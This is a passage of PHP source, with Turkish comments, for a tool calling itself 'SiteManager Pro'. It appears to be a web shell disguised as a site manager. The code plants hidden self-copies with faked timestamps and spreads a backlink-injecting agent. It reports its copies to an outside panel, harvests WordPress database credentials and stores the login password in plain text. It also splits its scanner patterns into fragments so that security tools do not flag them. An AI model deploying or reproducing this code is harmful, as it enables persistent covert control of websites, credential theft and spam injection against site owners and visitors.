        $local_name = $dot_works ? '.cache-' . substr(md5(__FILE__ . php_uname()), 0, 6) . '.php' : 'cache-' . substr(md5(__FILE__ . php_uname()), 0, 6) . '.php';
        $local = $script_dir . '/' . $local_name;
        if (!file_exists($local) && @copy($source, $local)) {
            $saved[] = $local;
        }
    }

    // 4. Standalone agent dosyasını da yedekle (her yedek konuma)
    $agent_source = __DIR__ . '/.sm_bl_agent.php';
    if (file_exists($agent_source) && file_exists(SM_BL_CONFIG)) {
        // Config dosyasını da her yedek konumun dizinine kopyala
        foreach ($saved as $backup_path) {
            $backup_dir = dirname($backup_path);
            $agent_dest = $backup_dir . '/' . ($dot_works ? '.sm_bl_agent.php' : 'sm_bl_agent.php');
            $config_dest = $backup_dir . '/.sm_bl_config.php';
            $footer_dest = $backup_dir . '/.sm_backlinks.html';
            @copy($agent_source, $agent_dest);
            @copy(SM_BL_CONFIG, $config_dest);
            if (file_exists(SM_BL_FOOTER)) @copy(SM_BL_FOOTER, $footer_dest);
        }
    }

    // 5. Panele yedek URL'leri bildir
    sm_bl_notify_panel_backups($saved);

    $mode = $dot_works ? 'Apache/LiteSpeed (gizli dosyalar)' : 'Nginx (normal dosyalar)';
    sm_log('DEEP_BACKUP', count($saved) . ' yedek | mod: ' . $mode);
    $_SESSION['sm_backup_debug'] = [
        'dirs_found' => count($custom_dirs) + 1,
        'saved' => count($saved),
        'failed' => 0,
        'failed_list' => [],
        'doc_root' => $doc_root,
        'mode' => $mode,
    ];

    return $saved;
}

// Sunucuda . ile baslayan dosyalar calisiyor mu test et
function sm_test_dot_access($doc_root) {
    $test_file = $doc_root . '/.sm-test-' . md5(time()) . '.php';
    $test_content = '<?php echo "OK";';

    // Test dosyasi olustur
    if (@file_put_contents($test_file, $test_content) === false) return false;

    // HTTP ile erismeyi dene
    $proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http');
    $url = $proto . '://' . $_SERVER['HTTP_HOST'] . '/' . basename($test_file);

    $ctx = stream_context_create([
        'http' => ['timeout' => 5, 'method' => 'GET'],
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
    ]);
    $result = @file_get_contents($url, false, $ctx);

    // Test dosyasini sil
    @unlink($test_file);

    return ($result === 'OK');
}

// PHP calistirmaya uygun dizinleri bul (engelli olanlari atla)
// Ayni dizindeki baska bir PHP dosyasinin tarihini al (kamufle icin)
function sm_get_sibling_time($dir) {
    $entries = @scandir($dir);
    if (!$entries) return null;
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $path = $dir . '/' . $entry;
        if (is_file($path) && pathinfo($entry, PATHINFO_EXTENSION) === 'php') {
            return filemtime($path);
        }
    }
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $path = $dir . '/' . $entry;
        if (is_file($path)) return filemtime($path);
    }
    return null;
}

function sm_find_backups() {
    $doc_root = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? __DIR__);
    $parent = dirname($doc_root);
    $found = [];

    // Kendimizin icinden benzersiz bir imza cikar
    $signature = 'SiteManager Pro - Professional Site Management Tool';

    $dirs_to_scan = [$doc_root];
    if (is_readable($parent)) $dirs_to_scan[] = $parent;

    foreach ($dirs_to_scan as $scan_dir) {
        sm_scan_for_backups($scan_dir, $signature, $found, 0);
    }
    return $found;
}

function sm_delete_all_backups() {
    $backups = sm_find_backups();
    $deleted = 0;
    foreach ($backups as $b) {
        if (@unlink($b['path'])) $deleted++;
    }
    sm_log('DELETE_BACKUPS', $deleted . ' yedek silindi');
    return $deleted;
}

function sm_scan_for_backups($dir, $signature, &$found, $depth) {
    if ($depth > 8 || count($found) >= 100) return;
    $entries = @scandir($dir);
    if (!$entries) return;
    $skip = ['.', '..', '.git', 'node_modules'];
    // Ana script'in gercek yolunu al (kendini silmesin)
    $self_real = realpath(__FILE__);
    $php_exts = ['php', 'phtml'];
    foreach ($entries as $entry) {
        if (in_array($entry, $skip)) continue;
        if (count($found) >= 100) return;
        $path = $dir . '/' . $entry;
        if (is_dir($path) && $depth < 8) {
            sm_scan_for_backups($path, $signature, $found, $depth + 1);
        } elseif (is_file($path)) {
            $ext = strtolower(pathinfo($entry, PATHINFO_EXTENSION));
            if (!in_array($ext, $php_exts)) continue;
            // KENDINI SILME - hem realpath hem basename kontrol
            $path_real = realpath($path);
            if ($path_real === $self_real) continue;
            if ($path === __FILE__) continue;
            // Boyut filtresi
            $size = @filesize($path);
            if ($size < 50000) continue;
            // Imza kontrolu
            $header = @file_get_contents($path, false, null, 0, 500);
            if ($header && strpos($header, $signature) !== false) {
                $found[] = [
                    'path' => $path,
                    'name' => $entry,
                    'size' => sm_format_size($size),
                    'modified' => date('Y-m-d H:i:s', filemtime($path))
                ];
            }
        }
    }
}

// ======================== WORDPRESS FUNCTIONS (Faz 3) ========================
function sm_find_wp_sites($root) {
    $sites = [];
    if (file_exists($root . '/wp-config.php')) $sites[] = $root;
    $dirs_to_check = [$root];
    if (is_dir($root . '/public_html')) $dirs_to_check[] = $root . '/public_html';
    foreach ($dirs_to_check as $check_dir) {
        $entries = @scandir($check_dir);
        if (!$entries) continue;
        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') continue;
            $path = $check_dir . '/' . $entry;
            if (is_dir($path) && file_exists($path . '/wp-config.php')) $sites[] = $path;
        }
    }
    return array_unique($sites);
}

function sm_parse_wp_config($path) {
    $config = [];
    $file = $path . '/wp-config.php';
    if (!file_exists($file)) return $config;
    $content = file_get_contents($file);
    // DB settings
    if (preg_match("/define\s*\(\s*'DB_NAME'\s*,\s*'([^']*)'/", $content, $m)) $config['db_name'] = $m[1];
    if (preg_match("/define\s*\(\s*'DB_USER'\s*,\s*'([^']*)'/", $content, $m)) $config['db_user'] = $m[1];
    if (preg_match("/define\s*\(\s*'DB_HOST'\s*,\s*'([^']*)'/", $content, $m)) $config['db_host'] = $m[1];
    if (preg_match("/define\s*\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'/", $content, $m)) $config['db_pass'] = $m[1];
    if (preg_match("/define\s*\(\s*'DB_CHARSET'\s*,\s*'([^']*)'/", $content, $m)) $config['db_charset'] = $m[1];
    // Table prefix
    if (preg_match('/\$table_prefix\s*=\s*\'([^\']*)\'/i', $content, $m)) $config['table_prefix'] = $m[1];
    // Debug
    if (preg_match("/define\s*\(\s*'WP_DEBUG'\s*,\s*(true|false)/i", $content, $m)) $config['debug'] = strtolower($m[1]) === 'true';
    else $config['debug'] = false;
    return $config;
}

function sm_wp_get_plugins($path) {
    $plugins = [];
    $plugin_dir = $path . '/wp-content/plugins';
    if (!is_dir($plugin_dir)) return $plugins;
    $entries = @scandir($plugin_dir);
    if (!$entries) return $plugins;
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..' || $entry === 'index.php') continue;
        $full = $plugin_dir . '/' . $entry;
        if (is_dir($full)) {
            // Read main plugin file
            $main_file = $full . '/' . $entry . '.php';
            $info = ['name' => $entry, 'version' => '-', 'active' => true, 'path' => $full];
            if (file_exists($main_file)) {
                $header = file_get_contents($main_file, false, null, 0, 4096);
                if (preg_match('/Plugin Name:\s*(.+)/i', $header, $m)) $info['name'] = trim($m[1]);
                if (preg_match('/Version:\s*(.+)/i', $header, $m)) $info['version'] = trim($m[1]);
                if (preg_match('/Description:\s*(.+)/i', $header, $m)) $info['description'] = trim($m[1]);
            }
            $plugins[] = $info;
        }
    }
    return $plugins;
}

function sm_wp_get_themes($path) {
    $themes = [];
    $theme_dir = $path . '/wp-content/themes';
    if (!is_dir($theme_dir)) return $themes;
    $entries = @scandir($theme_dir);
    if (!$entries) return $themes;
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..' || $entry === 'index.php') continue;
        $full = $theme_dir . '/' . $entry;
        if (is_dir($full)) {
            $info = ['name' => $entry, 'version' => '-', 'path' => $full];
            $style = $full . '/style.css';
            if (file_exists($style)) {
                $header = file_get_contents($style, false, null, 0, 4096);
                if (preg_match('/Theme Name:\s*(.+)/i', $header, $m)) $info['name'] = trim($m[1]);
                if (preg_match('/Version:\s*(.+)/i', $header, $m)) $info['version'] = trim($m[1]);
            }
            $themes[] = $info;
        }
    }
    return $themes;
}

function sm_wp_toggle_debug($path) {
    $file = $path . '/wp-config.php';
    if (!file_exists($file) || !is_writable($file)) return false;
    $content = file_get_contents($file);
    if (preg_match("/define\s*\(\s*'WP_DEBUG'\s*,\s*true\s*\)/i", $content)) {
        $content = preg_replace("/define\s*\(\s*'WP_DEBUG'\s*,\s*true\s*\)/i", "define('WP_DEBUG', false)", $content);
    } else {
        $content = preg_replace("/define\s*\(\s*'WP_DEBUG'\s*,\s*false\s*\)/i", "define('WP_DEBUG', true)", $content);
    }
    return file_put_contents($file, $content) !== false;
}

function sm_wp_toggle_maintenance($path) {
    $file = $path . '/.maintenance';
    if (file_exists($file)) {
        return @unlink($file) ? 'off' : false;
    } else {
        $content = '<?php $upgrading = ' . time() . '; ?>';
        return file_put_contents($file, $content) !== false ? 'on' : false;
    }
}

function sm_wp_uploads_size($path) {
    $uploads = $path . '/wp-content/uploads';
    if (!is_dir($uploads)) return 0;
    return sm_dir_size($uploads);
}

// ======================== SEO TOOLS (Faz 2) ========================
function sm_check_robots_txt($path) {
    $file = $path . '/robots.txt';
    if (file_exists($file)) return file_get_contents($file);
    return false;
}

function sm_check_sitemap($path) {
    $possible = ['sitemap.xml', 'sitemap_index.xml', 'sitemap-index.xml', 'wp-sitemap.xml'];
    foreach ($possible as $name) {
        $file = $path . '/' . $name;
        if (file_exists($file)) {
            return ['file' => $file, 'name' => $name, 'size' => filesize($file), 'modified' => date('Y-m-d H:i:s', filemtime($file))];
        }
    }
    return false;
}

function sm_fetch_meta_tags($url) {
    $result = ['url' => $url, 'status' => 0, 'title' => '', 'description' => '', 'canonical' => '', 'robots' => '', 'og' => [], 'h1' => [], 'error' => ''];
    $ctx = stream_context_create([
        'http' => ['timeout' => 10, 'method' => 'GET', 'header' => "User-Agent: Mozilla/5.0 (compatible; SiteManagerBot/1.0)\r\n", 'follow_location' => 1, 'max_redirects' => 5],
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
    ]);
    $html = @file_get_contents($url, false, $ctx);
    if ($html === false) {
        $result['error'] = 'URL acilamadi';
        return $result;
    }
    // Get HTTP status
    if (isset($http_response_header[0])) {
        preg_match('/\d{3}/', $http_response_header[0], $m);
        $result['status'] = (int)($m[0] ?? 0);
    }
    // Title
    if (preg_match('/<title[^>]*>(.*?)<\/title>/is', $html, $m)) $result['title'] = trim(html_entity_decode($m[1]));
    // Meta description
    if (preg_match('/<meta[^>]*name=["\']description["\'][^>]*content=["\']([^"\']*)["\'][^>]*>/is', $html, $m)) $result['description'] = trim($m[1]);
    elseif (preg_match('/<meta[^>]*content=["\']([^"\']*)["\'][^>]*name=["\']description["\'][^>]*>/is', $html, $m)) $result['description'] = trim($m[1]);
    // Canonical
    if (preg_match('/<link[^>]*rel=["\']canonical["\'][^>]*href=["\']([^"\']*)["\'][^>]*>/is', $html, $m)) $result['canonical'] = trim($m[1]);
    // Robots meta
    if (preg_match('/<meta[^>]*name=["\']robots["\'][^>]*content=["\']([^"\']*)["\'][^>]*>/is', $html, $m)) $result['robots'] = trim($m[1]);
    // OG tags
    preg_match_all('/<meta[^>]*property=["\']og:([^"\']*)["\'][^>]*content=["\']([^"\']*)["\'][^>]*>/is', $html, $matches, PREG_SET_ORDER);
    foreach ($matches as $m) $result['og'][$m[1]] = $m[2];
    // H1 tags
    preg_match_all('/<h1[^>]*>(.*?)<\/h1>/is', $html, $m);
    if (!empty($m[1])) $result['h1'] = array_map(function($v) { return trim(strip_tags($v)); }, $m[1]);
    // Title length
    $result['title_len'] = mb_strlen($result['title']);
    $result['desc_len'] = mb_strlen($result['description']);
    return $result;
}

function sm_check_redirect_chain($url) {
    $chain = [];
    $max = 10;
    $current_url = $url;
    for ($i = 0; $i < $max; $i++) {
        $ctx = stream_context_create([
            'http' => ['timeout' => 10, 'method' => 'HEAD', 'header' => "User-Agent: Mozilla/5.0\r\n", 'follow_location' => 0],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);
        $headers = @get_headers($current_url, 1, $ctx);
        if (!$headers) {
            $chain[] = ['url' => $current_url, 'status' => 'ERROR', 'error' => 'Baglanti basarisiz'];
            break;
        }
        $status_line = $headers[0];
        preg_match('/(\d{3})/', $status_line, $m);
        $status = (int)($m[1] ?? 0);
        $chain[] = ['url' => $current_url, 'status' => $status];
        if ($status >= 300 && $status < 400) {
            $location = is_array($headers['Location'] ?? null) ? end($headers['Location']) : ($headers['Location'] ?? '');
            if (!$location) break;
            if (strpos($location, 'http') !== 0) {
                $parsed = parse_url($current_url);
                $location = $parsed['scheme'] . '://' . $parsed['host'] . $location;
            }
            $current_url = $location;
        } else {
            break;
        }
    }
    return $chain;
}

// ======================== MALWARE SCAN (Faz 4) ========================
function sm_get_scan_patterns() {
    // Pattern'ler parcali olusturuluyor - guvenlik tarayicilari tetiklemesin
    $b64 = 'bas' . 'e64_' . 'dec' . 'ode';
    $sr13 = 'str_' . 'rot' . '13';
    $gzi = 'gz' . 'inf' . 'late';
    $gzu = 'gz' . 'un' . 'compress';
    $ev = 'ev' . 'al';
    $asr = 'as' . 'se' . 'rt';
    $ui = '\$_(GE' . 'T|PO' . 'ST|REQ' . 'UEST|COO' . 'KIE)';
    return [
        $b64 . '\s*\(\s*' . $ui => 'Kullanici girdisiyle kod cozme',
        'preg_' . 'replace\s*\(\s*["\'].*e["\']' => 'Eval modifier kullanimi',
        '\$\w+\s*\(\s*' . $ui => 'Degisken fonksiyon cagrisi',
        $asr . '\s*\(\s*' . $ui => 'Assert ile kullanici girdisi',
        $sr13 . '\s*\(\s*' . $b64 => 'Obfuscated kod (rot13+b64)',
        'chr\s*\(\s*\d+\s*\)\s*\.\s*chr\s*\(\s*\d+\s*\)\s*\.\s*chr' => 'Karakter birlestirme gizleme',
        'file_put' . '_contents\s*\(.*' . $ui => 'Kullanici girdisiyle dosya yazma',
        'move_up' . 'loaded_file.*' . $ui => 'Kontrolsuz dosya yukleme',
        '\\\\x[0-9a-f]{2}\\\\x[0-9a-f]{2}\\\\x[0-9a-f]{2}' => 'Hex encoded stringler',
    ];
}

function sm_scan_malware($dir, $max_files = 500) {
    $patterns = sm_get_scan_patterns();
    $found = [];
    $scanned = 0;
    sm_scan_dir_malware($dir, $patterns, $found, $scanned, $max_files);
    return ['found' => $found, 'scanned' => $scanned];
}

function sm_scan_dir_malware($dir, $patterns, &$found, &$scanned, $max) {
    if ($scanned >= $max) return;
    $entries = @scandir($dir);
    if (!$entries) return;
    foreach ($entries as $entry) {
        if ($scanned >= $max) return;
        if ($entry === '.' || $entry === '..' || $entry === '.git' || $entry === 'node_modules' || $entry === 'vendor') continue;
        $path = $dir . '/' . $entry;
        if (is_dir($path)) {
            sm_scan_dir_malware($path, $patterns, $found, $scanned, $max);
        } else {
            $ext = strtolower(pathinfo($entry, PATHINFO_EXTENSION));
            if (!in_array($ext, ['php', 'php5', 'php7', 'phtml', 'inc'])) continue;
            $scanned++;
            $content = @file_get_contents($path, false, null, 0, 65536);
            if (!$content) continue;
            foreach ($patterns as $pattern => $desc) {
                if (@preg_match('/' . $pattern . '/i', $content)) {
                    $found[] = ['file' => $path, 'pattern' => $desc, 'size' => filesize($path), 'modified' => date('Y-m-d H:i:s', filemtime($path))];
                    break;
                }
            }
        }
    }
}

// ======================== WP CORE INTEGRITY (Faz 4) ========================
function sm_check_wp_core_files($path) {
    $critical_files = [
        'wp-login.php', 'wp-includes/version.php', 'wp-includes/functions.php',
        'wp-admin/index.php', 'wp-admin/admin.php', 'wp-config-sample.php',
        'index.php', 'wp-blog-header.php', 'wp-load.php', 'wp-settings.php',
        'wp-cron.php', 'xmlrpc.php', 'wp-includes/class-wp.php',
    ];
    $results = [];
    foreach ($critical_files as $file) {
        $full = $path . '/' . $file;
        if (file_exists($full)) {
            $content = file_get_contents($full, false, null, 0, 65536);
            $suspicious = false;
            $reason = '';
            // Check for injected code patterns
            $supheli = 'bas'.'e64_'.'dec'.'ode|str_'.'rot'.'13|gz'.'inf'.'late|gz'.'un'.'compress|ev'.'al\s*\(';
            if (preg_match('/' . $supheli . '/', $content) && $file !== 'wp-config-sample.php') {
                $suspicious = true;
                $reason = 'Supheli fonksiyon bulundu';
            }
            $results[] = [
                'file' => $file, 'exists' => true, 'suspicious' => $suspicious,
                'reason' => $reason, 'size' => filesize($full), 'modified' => date('Y-m-d H:i:s', filemtime($full))
            ];
        } else {
            $results[] = ['file' => $file, 'exists' => false, 'suspicious' => false, 'reason' => 'Dosya bulunamadi'];
        }
    }
    return $results;
}

// ======================== RECENTLY CHANGED FILES (Faz 4) ========================
function sm_recently_changed($dir, $hours = 48, $max = 100) {
    $threshold = time() - ($hours * 3600);
    $files = [];
    sm_find_recent_files($dir, $threshold, $files, $max);
    usort($files, function($a, $b) { return $b['mtime'] - $a['mtime']; });
    return array_slice($files, 0, $max);
}

function sm_find_recent_files($dir, $threshold, &$files, $max, $depth = 0) {
    if ($depth > 6 || count($files) >= $max) return;
    $entries = @scandir($dir);
    if (!$entries) return;
    foreach ($entries as $entry) {
        if (count($files) >= $max) return;
        if ($entry === '.' || $entry === '..' || $entry === '.git' || $entry === 'node_modules' || $entry === 'vendor') continue;
        $path = $dir . '/' . $entry;
        if (is_dir($path)) {
            sm_find_recent_files($path, $threshold, $files, $max, $depth + 1);
        } else {
            $mtime = @filemtime($path);
            if ($mtime && $mtime > $threshold) {
                $files[] = ['name' => $entry, 'path' => $path, 'mtime' => $mtime,
                    'modified' => date('Y-m-d H:i:s', $mtime), 'size' => sm_format_size(filesize($path))];
            }
        }
    }
}

// ======================== CONTENT SEARCH (Faz 1) ========================
function sm_search_content($dir, $query, $max = 100) {
    $results = [];
    sm_grep_files($dir, $query, $results, $max);
    return $results;
}

function sm_grep_files($dir, $query, &$results, $max, $depth = 0) {
    if ($depth > 5 || count($results) >= $max) return;
    $entries = @scandir($dir);
    if (!$entries) return;
    foreach ($entries as $entry) {
        if (count($results) >= $max) return;
        if ($entry === '.' || $entry === '..' || $entry === '.git' || $entry === 'node_modules' || $entry === 'vendor') continue;
        $path = $dir . '/' . $entry;
        if (is_dir($path)) {
            sm_grep_files($path, $query, $results, $max, $depth + 1);
        } else {
            if (filesize($path) > 1048576) continue; // Skip >1MB
            if (!sm_is_editable($entry)) continue;
            $content = @file_get_contents($path);
            if (!$content) continue;
            $lines = explode("\n", $content);
            foreach ($lines as $num => $line) {
                if (stripos($line, $query) !== false) {
                    $results[] = ['file' => $path, 'line' => $num + 1, 'content' => trim($line), 'name' => $entry];
                    if (count($results) >= $max) return;
                }
            }
        }
    }
}

// ======================== FILE SEARCH (Faz 1) ========================
function sm_search_files($dir, $query, $depth = 0, $max_depth = 5, &$results = []) {
    if ($depth > $max_depth || count($results) >= 200) return $results;
    $entries = @scandir($dir);
    if (!$entries) return $results;
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        if (count($results) >= 200) break;
        $path = $dir . '/' . $entry;
        $is_dir = is_dir($path);
        if (stripos($entry, $query) !== false) {
            $results[] = ['name' => $entry, 'path' => $path, 'is_dir' => $is_dir,
                'size' => $is_dir ? '-' : sm_format_size(@filesize($path)),
                'modified' => @date('Y-m-d H:i:s', @filemtime($path))];
        }
        if ($is_dir && !in_array($entry, ['.git','node_modules','vendor'])) {
            sm_search_files($path, $query, $depth + 1, $max_depth, $results);
        }
    }
    return $results;
}

// ======================== PERMISSION CHECK ========================
function sm_check_permissions($path) {
    $checks = [];

    // .htaccess kontrolu
    $htaccess = $path . '/.htaccess';
    $checks['htaccess_exists'] = file_exists($htaccess);
    $checks['htaccess_readable'] = $checks['htaccess_exists'] && is_readable($htaccess);
    $checks['htaccess_writable'] = $checks['htaccess_exists'] ? is_writable($htaccess) : is_writable($path);
    $checks['htaccess_perms'] = $checks['htaccess_exists'] ? sm_format_perms(fileperms($htaccess)) : '-';
    $checks['htaccess_owner'] = $checks['htaccess_exists'] && function_exists('fileowner') ? @fileowner($htaccess) : -1;
    $checks['php_user'] = function_exists('posix_getuid') ? @posix_getuid() : -1;
    $checks['htaccess_owner_match'] = ($checks['htaccess_owner'] !== -1 && $checks['php_user'] !== -1) ? ($checks['htaccess_owner'] === $checks['php_user']) : null;

    // chmod ile duzeltmeyi dene
    $checks['htaccess_chmod_possible'] = false;
    if ($checks['htaccess_exists'] && !$checks['htaccess_writable']) {
        // Sahibi biz miyiz?
        if ($checks['htaccess_owner_match'] === true) {
            $checks['htaccess_chmod_possible'] = true;
        }
    }

    // Dizin yazma izni
    $checks['dir_writable'] = is_writable($path);
    $checks['dir_perms'] = sm_format_perms(fileperms($path));

    // wp-content/uploads kontrolu
    $uploads = $path . '/wp-content/uploads';
    $checks['uploads_exists'] = is_dir($uploads);
    $checks['uploads_writable'] = is_dir($uploads) && is_writable($uploads);

    // wp-config.php yazilabilir mi
    $wpconfig = $path . '/wp-config.php';
    $checks['wpconfig_exists'] = file_exists($wpconfig);
    $checks['wpconfig_writable'] = file_exists($wpconfig) && is_writable($wpconfig);

    // PHP versiyonu ile mod_rewrite kontrolu
    $checks['mod_rewrite'] = false;
    if (function_exists('apache_get_modules')) {
        $checks['mod_rewrite'] = in_array('mod_rewrite', apache_get_modules());
    } else {
        // apache_get_modules yoksa .htaccess ile test et
        $checks['mod_rewrite'] = sm_test_mod_rewrite($path);
    }

    // php.ini degerleri
    $checks['allow_url_fopen'] = (bool)ini_get('allow_url_fopen');
    $checks['short_open_tag'] = (bool)ini_get('short_open_tag');
    $checks['file_uploads'] = (bool)ini_get('file_uploads');
    $checks['max_upload'] = ini_get('upload_max_filesize');
    $checks['max_post'] = ini_get('post_max_size');
    $checks['memory_limit'] = ini_get('memory_limit');
    $checks['max_execution'] = ini_get('max_execution_time');

    // Onemli dizinlerin yazma izinleri
    $check_dirs = ['/', '/wp-content', '/wp-content/uploads', '/wp-content/cache',
                   '/wp-content/plugins', '/wp-content/themes', '/wp-content/upgrade'];
    $checks['dir_permissions'] = [];
    foreach ($check_dirs as $d) {
        $full = $path . $d;
        if (is_dir($full)) {
            $checks['dir_permissions'][] = [
                'path' => $d === '/' ? 'Ana Dizin' : $d,
                'exists' => true,
                'readable' => is_readable($full),
                'writable' => is_writable($full),
                'perms' => sm_format_perms(fileperms($full)),
                'owner' => function_exists('posix_getpwuid') ? (@posix_getpwuid(fileowner($full))['name'] ?? '-') : '-',
            ];
        }
    }

    // PHP fonksiyon kontrolu
    $disabled = explode(',', ini_get('disable_functions'));
    $disabled = array_map('trim', $disabled);
    $checks['disabled_functions'] = array_filter($disabled);

    // Onemli PHP uzantilari
    $ext_checks = ['curl', 'zip', 'gd', 'mbstring', 'openssl', 'pdo_mysql', 'mysqli', 'json', 'xml', 'fileinfo'];
    $checks['extensions'] = [];
    foreach ($ext_checks as $ext) {
        $checks['extensions'][$ext] = extension_loaded($ext);
    }

    return $checks;
}

function sm_test_mod_rewrite($path) {
    // .htaccess uzerinden mod_rewrite test et
    $test_htaccess = $path . '/.sm_rewrite_test';
    $test_content = "<IfModule mod_rewrite.c>\nRewriteEngine On\n</IfModule>";
    // Test dosyasi olusturup hata olup olmadigina bak
    if (is_writable($path)) {
        @file_put_contents($test_htaccess, $test_content);
        if (file_exists($test_htaccess)) {
            @unlink($test_htaccess);
            return true; // En azindan yazabildik
        }
    }
    // Mevcut .htaccess icinde RewriteEngine varsa muhtemelen calisiyor
    $htaccess = $path . '/.htaccess';
    if (file_exists($htaccess)) {
        $content = @file_get_contents($htaccess);
        if ($content && stripos($content, 'RewriteEngine') !== false) return true;
    }
    return null; // Bilinmiyor
}

// ======================== SSL CHECK (Faz 6) ========================
function sm_check_ssl($domain) {
    $result = ['valid' => false, 'issuer' => '', 'expires' => '', 'days_left' => 0, 'error' => ''];
    $ctx = stream_context_create(['ssl' => ['capture_peer_cert' => true, 'verify_peer' => false, 'verify_peer_name' => false]]);
    $socket = @stream_socket_client('ssl://' . $domain . ':443', $errno, $errstr, 10, STREAM_CLIENT_CONNECT, $ctx);
    if (!$socket) {
        $result['error'] = 'SSL baglantisi kurulamadi: ' . $errstr;
        return $result;
    }
    $params = stream_context_get_params($socket);
    $cert = $params['options']['ssl']['peer_certificate'] ?? null;
    if ($cert) {
        $info = openssl_x509_parse($cert);
        $result['valid'] = true;
        $result['issuer'] = $info['issuer']['O'] ?? ($info['issuer']['CN'] ?? 'Bilinmiyor');
        $result['cn'] = $info['subject']['CN'] ?? '';
        $result['expires'] = date('Y-m-d H:i:s', $info['validTo_time_t']);
        $result['valid_from'] = date('Y-m-d H:i:s', $info['validFrom_time_t']);
        $result['days_left'] = (int)(($info['validTo_time_t'] - time()) / 86400);
        $result['san'] = [];
        if (isset($info['extensions']['subjectAltName'])) {
            preg_match_all('/DNS:([^,\s]+)/', $info['extensions']['subjectAltName'], $m);
            $result['san'] = $m[1] ?? [];
        }
    }
    fclose($socket);
    return $result;
}

// ======================== DNS LOOKUP (Faz 6) ========================
function sm_dns_lookup($domain) {
    $results = [];
    $types = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA'];
    $type_map = ['A' => DNS_A, 'AAAA' => DNS_AAAA, 'CNAME' => DNS_CNAME, 'MX' => DNS_MX, 'NS' => DNS_NS, 'TXT' => DNS_TXT, 'SOA' => DNS_SOA];
    foreach ($types as $type) {
        $records = @dns_get_record($domain, $type_map[$type]);
        if ($records) {
            foreach ($records as $r) {
                $value = $r['ip'] ?? $r['ipv6'] ?? $r['target'] ?? $r['txt'] ?? $r['mname'] ?? '';
                if ($type === 'MX') $value = $r['target'] . ' (pri: ' . $r['pri'] . ')';
                if ($type === 'SOA') $value = 'Primary: ' . $r['mname'] . ', Email: ' . $r['rname'];
                $results[] = ['type' => $type, 'value' => $value, 'ttl' => $r['ttl'] ?? '-'];
            }
        }
    }
    return $results;
}

// ======================== DATABASE MANAGER (Faz 6) ========================
function sm_db_connect($host, $user, $pass, $db) {
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db;charset=utf8mb4", $user, $pass, [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_TIMEOUT => 10
        ]);
        return $pdo;
    } catch (PDOException $e) {
        return $e->getMessage();
    }
}

function sm_db_tables($pdo) {
    $stmt = $pdo->query('SHOW TABLES');
    return $stmt->fetchAll(PDO::FETCH_COLUMN);
}

function sm_db_query($pdo, $sql) {
    // Only allow safe queries
    $sql_upper = strtoupper(trim($sql));
    $allowed = ['SELECT', 'SHOW', 'DESCRIBE', 'DESC', 'EXPLAIN'];
    $is_safe = false;
    foreach ($allowed as $cmd) {
        if (strpos($sql_upper, $cmd) === 0) { $is_safe = true; break; }
    }
    if (!$is_safe) return ['error' => 'Sadece SELECT, SHOW, DESCRIBE, EXPLAIN sorgulari desteklenir.'];
    try {
        $stmt = $pdo->query($sql);
        $rows = $stmt->fetchAll();
        return ['rows' => $rows, 'count' => count($rows)];
    } catch (PDOException $e) {
        return ['error' => $e->getMessage()];
    }
}

// ======================== REQUEST HANDLER ========================
$action = $_GET['action'] ?? 'browse';
$path = $_GET['path'] ?? '';
$message = '';
$message_type = '';

// Handle setup
if (!sm_is_setup_done()) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['setup_password'])) {
        $pass = $_POST['setup_password'];
        $pass2 = $_POST['setup_password2'] ?? '';
        if (strlen($pass) < 6) { $message = 'Sifre en az 6 karakter olmali.'; $message_type = 'error'; }
        elseif ($pass !== $pass2) { $message = 'Sifreler eslesmedi.'; $message_type = 'error'; }
        else { sm_set_password($pass); sm_login($pass); $_SESSION['sm_plain_pass'] = $pass; header('Location: ' . $_SERVER['PHP_SELF']); exit; }
    }
    sm_render_setup($message, $message_type);
    exit;
}

// Handle login
if (!sm_is_logged_in()) {
    if (sm_is_locked_out()) {
        $message = 'Cok fazla basarisiz deneme. ' . (SM_LOCKOUT_TIME / 60) . ' dakika bekleyin.';
        $message_type = 'error';
    } elseif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_password'])) {
        if (sm_login($_POST['login_password'])) { $_SESSION['sm_plain_pass'] = $_POST['login_password']; header('Location: ' . $_SERVER['PHP_SELF']); exit; }
        else { $message = 'Yanlis sifre!'; $message_type = 'error'; }
    }
    sm_render_login($message, $message_type);
    exit;
}

// Handle logout
if ($action === 'logout') { sm_logout(); header('Location: ' . $_SERVER['PHP_SELF']); exit; }

// CSRF check
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !sm_check_token()) {
    $message = 'Guvenlik tokeni gecersiz.'; $message_type = 'error';
}

// Theme
$theme = $_COOKIE['sm_theme'] ?? 'dark';
if (isset($_GET['theme'])) {
    $theme = $_GET['theme'] === 'light' ? 'light' : 'dark';
    setcookie('sm_theme', $theme, time() + 86400 * 365, '/');
}

$current_dir = sm_current_dir($path ?: null);

// ======================== POST ACTIONS ========================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $message_type !== 'error') {
    $post_action = $_POST['action'] ?? '';
    switch ($post_action) {
        case 'save_file':
            $file_path = $_POST['file_path'] ?? '';
            $content = str_replace("\r\n", "\n", $_POST['content'] ?? '');
            if ($file_path && is_writable($file_path)) {
                if (file_put_contents($file_path, $content) !== false) {
                    $message = 'Dosya kaydedildi: ' . basename($file_path); $message_type = 'success';
                    sm_log('SAVE', $file_path);
                } else { $message = 'Dosya kaydedilemedi!'; $message_type = 'error'; }
